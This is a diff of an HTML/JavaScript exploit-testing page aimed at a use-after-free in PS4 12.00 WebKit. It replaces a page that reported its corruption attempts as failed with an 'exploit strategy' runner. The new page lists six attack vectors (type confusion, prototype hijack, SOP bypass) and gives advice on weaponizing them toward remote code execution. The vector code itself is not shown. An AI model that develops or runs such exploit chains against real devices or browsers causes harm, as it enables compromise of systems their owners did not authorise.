-    log("\n⚠️  Length corrupted but no OOB access", 'warning');
-    log("   The corruption is superficial (JS-level only)");
-    
-    statusEl.textContent = "SUPERFICIAL CORRUPTION";
-    statusEl.className = "warning";
-    
+  if(successCount > 0) {
+    log("\n🎯 CRITICAL: One or more vectors showed full exploitation!", 'critical');
+    log("   Focus on the successful vector(s) for weaponization.", 'critical');
+    log("   These have the highest chance of achieving RCE.\n");
+  } else if(partialCount > 0) {
+    log("\n⚠️  Several vectors showed partial success.", 'warning');
+    log("   These indicate the UAF is affecting the system.", 'warning');
+    log("   Refinement needed to achieve full exploitation.\n");
   } else {
-    log("\n❌ All corruption attempts failed", 'error');
-    log("\nThis is expected in modern browsers due to:", 'warning');
-    log("  • Hardened TypedArray implementations");
-    log("  • Bounds checking at VM level");
-    log("  • Memory protections (ASLR, W^X)");
-    log("  • Separate heaps for different object types");
-    
-    log("\nReal PS4 exploits would use:", 'warning');
-    log("  • Kernel-specific vulnerabilities");
-    log("  • WebKit version-specific bugs");
-    log("  • JIT compiler exploits");
-    log("  • GPU memory corruption");
-    
-    statusEl.textContent = "CORRUPTION FAILED (EXPECTED)";
-    statusEl.className = "error";
+    log("\n❌ No vectors showed exploitation potential.", 'error');
+    log("   The UAF may not be exploitable via these methods.", 'error');
+    log("   Consider alternative approaches:\n");
+    log("   1. Look for a secondary bug (OOB, type confusion)", 'info');
+    log("   2. Investigate other WebCore primitives", 'info');
+    log("   3. Research public exploits for similar bugs\n", 'info');
   }
   
-  log("\n=================================================================");
-  log("POC COMPLETE", 'success');
+  // Next steps
+  log("NEXT STEPS:", 'critical');
+  log("1. Analyze which vectors had partial/full success");
+  log("2. Refine timing and memory state for those vectors");
+  log("3. Combine multiple vectors if possible");
+  log("4. Research WebKit source code for affected components");
+  log("5. Look for CVEs with similar patterns\n");
+  
+  // Status update
+  if(successCount > 0) {
+    statusEl.textContent = `${successCount} Vector(s) Successful! 🎯`;
+    statusEl.className = "critical";
+    statusEl.style.borderColor = "#f0f";
+  } else if(partialCount > 0) {
+    statusEl.textContent = `${partialCount} Vector(s) Partial Success ⚠️`;
+    statusEl.className = "warning";
+    statusEl.style.borderColor = "#ff0";
+  } else {
+    statusEl.textContent = "All Vectors Failed ❌";
+    statusEl.className = "error";
+    statusEl.style.borderColor = "#f00";
+  }
+  
+  log("=================================================================");
+  log("TESTING COMPLETE", 'success');
   log("=================================================================");
 }
 
-log("PS4 12.00 WebKit - Real Memory Corruption PoC\n");
-log("This PoC demonstrates multiple techniques to achieve");
-log("TypedArray corruption and OOB read/write primitives.\n");
-log("Click 'Execute Real Corruption' to test.\n");
-log("⚠️  Note: Modern browsers have strong protections", 'warning');
-log("⚠️  Real PS4 exploits use version-specific bugs", 'warning');
+// Initialize
+log("🎯 PS4 12.00 WebKit - Pivoting Exploit Strategy", 'critical');
+log("=================================================================\n");
+
+log("STRATEGY OVERVIEW:", 'info');
+log("Based on comprehensive analysis, the UAF in HistoryController");
+log("is NOT directly exploitable for memory corruption/RCE.");
+log("");
+log("However, it MAY enable secondary exploitation vectors:");
+log("");
+log("✓ Vector 1: Array Length Confusion");
+log("  - Exploit getter/setter inconsistencies");
+log("  - Target: Length property during popstate");
+log("");
+log("✓ Vector 2: Prototype Chain Hijack");
+log("  - Pollution with side-effects");
+log("  - Target: Serialization/deserialization");
+log("");
+log("✓ Vector 3: RegExp State Corruption");
+log("  - Manipulate lastIndex during UAF");
+log("  - Target: RegExp internal state");
+log("");
+log("✓ Vector 4: Lifetime Confusion");
+log("  - JS object alive, WebCore freed");
+log("  - Target: Cross-layer lifetime mismatch");
+log("");
+log("✓ Vector 5: SOP Bypass Attempt");
+log("  - SecurityOrigin confusion");
+log("  - Target: Same-Origin Policy checks");
+log("");
+log("✓ Vector 6: Type Confusion Bridge");
+log("  - Cross-layer type mismatch");
+log("  - Target: JS ↔ WebCore type assumptions");
+log("");
+log("=================================================================\n");
+
+log("Test each vector individually, or run all tests.", 'info');
+log("Results will show which vectors have exploitation potential.\n");
+
+log("⚠️  WARNING: These tests may cause browser instability.", 'warning');
+log("⚠️  Use in controlled environment only.\n", 'warning');
 </script>
 </body>
 </html>
